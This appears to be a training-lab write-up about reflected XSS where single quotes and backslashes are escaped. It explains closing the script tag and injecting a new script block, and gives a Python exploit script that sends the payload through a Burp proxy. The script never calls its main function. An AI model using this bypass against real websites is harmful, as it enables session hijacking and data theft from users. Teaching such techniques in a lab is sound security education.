## Reflected XSS into a JavaScript string with single quote and backslash escaped

<div style="text-align: justify;">
  This lab demonstrates a reflected cross-site scripting vulnerability where user input is embedded inside a JavaScript string. Both single quotes and backslashes are escaped by the application, preventing direct injection using those characters. To bypass this, you must close the `<script>` tag and inject your own script block, which successfully executes arbitrary JavaScript such as `alert(1)`.
</div>

<Aside>
  Start Burp Suite before running the script â€” it uses a proxy for visibility.
</Aside>

### How Exploit Works
- The search input is reflected inside a JavaScript string with escaping applied to single quotes (`'`) and backslashes (`\`).
- Simple injections like `test'payload` fail because of escaping.
- Instead, you inject an entire `</script>` closing tag, breaking out of the script context.
- Following it with `<script>alert(1)</script>` creates a new script block that executes JavaScript.
- This payload bypasses the escaping and successfully executes XSS.

### Usage

```cmd
python3 exploit.py https://<your-lab-id>.web-security-academy.net
```

### Exploit

```python title="exploit.py"
import requests
import sys
import urllib3

# Disable SSL warnings for Burp Suite
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def check_burp():
    # Check if Burp Suite is running and listening on the configured proxy.

    try:
        requests.get("http://127.0.0.1:8080", timeout=3)
    except requests.exceptions.RequestException:
        print("[-] Burp Suite is not running. Please start it and try again.")
        sys.exit(1)

def exploit_xss(url, payload):
    # Exploit XSS in search parameter.
        uri = f"/?search={payload}"
        res = requests.get(url + uri, verify=False, proxies=proxies)
        res.raise_for_status()
        session = requests.Session()
        res = session.get(url, verify=False, proxies=proxies)
        if "Congratulations" in res.text:
            print("[+] Lab solved ðŸŽ‰")
            return True
        else:
            print("[-] lab not solved.")

def main():
    # Entry point of the script.

    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <url>")
        print(f"Example: python {sys.argv[0]} https://example.com")
        sys.exit(1)

    url = sys.argv[1].strip()

    # Step 1: Check Burp Suite
    check_burp()

    # Step 2: Define XSS payload
    payload = '</script><script>alert(1)</script>'

    # Step 3: Attempt exploitation
    print("[*] Attempting XSS...")
    if exploit_xss(url, payload):
        print("[+] XSS successful!")
    else:
        print("[-] XSS unsuccessful.")
